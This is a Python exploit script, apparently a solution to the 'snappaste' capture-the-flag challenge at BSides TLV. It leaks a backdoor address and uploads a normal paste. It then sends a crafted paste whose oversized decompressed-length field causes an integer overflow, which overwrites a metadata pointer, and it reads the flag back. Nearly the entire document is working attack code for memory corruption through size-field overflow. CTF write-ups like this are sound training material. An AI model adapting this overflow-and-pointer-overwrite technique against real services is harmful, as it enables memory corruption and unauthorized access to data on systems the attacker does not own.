import requests
import struct
import zlib

session = requests.Session()

def get_backdoor_address():
    name = 'x'*16
    result = session.get(url='https://snappaste.ctf.bsidestlv.com/backdoor/' + name).text
    address = result[len('Set ') : -len(' to ' + name)]
    return int(address, 16)

def paste(metadata_size, data_compressed_size, data_decompressed_size, metadata, data_compressed):
    data = struct.pack('<III', metadata_size, data_compressed_size, data_decompressed_size)
    data += metadata
    data += data_compressed
    return session.post(url='https://snappaste.ctf.bsidestlv.com/paste', data=data).text

def view(name):
    result = session.get(url='https://snappaste.ctf.bsidestlv.com/view/' + name).text
    return result

print('Getting backdoor_address...')

backdoor_address = get_backdoor_address()
print(f'backdoor_address = {backdoor_address}')

print('Pasting a file...')

metadata = b'AAAA'
metadata_size = len(metadata)
data = b'BBBB'
data_compressed = zlib.compress(data)
data_compressed_size = len(data_compressed)
data_decompressed_size = len(data)

paste_file = paste(metadata_size, data_compressed_size, data_decompressed_size, metadata, data_compressed)
print(f'paste_file = {paste_file}')

print('Overriding backdoor_filename...')

metadata = paste_file.encode()
metadata_size = len(metadata)
data = struct.pack('<QQQQ', backdoor_address, 0, 0, 0)  # overrides metadata ptr, replace Q with I for 32-bit
data_compressed = zlib.compress(data)
data_compressed_size = len(data_compressed)
data_decompressed_size = 0x100000000 - 8  # int overflow! replace 8 with 4 for 32-bit
paste(metadata_size, data_compressed_size, data_decompressed_size, metadata, data_compressed)

print('Getting flag...')

flag = view(paste_file)
flag = flag[len('AAAA\0BBBB'):]
print(flag)
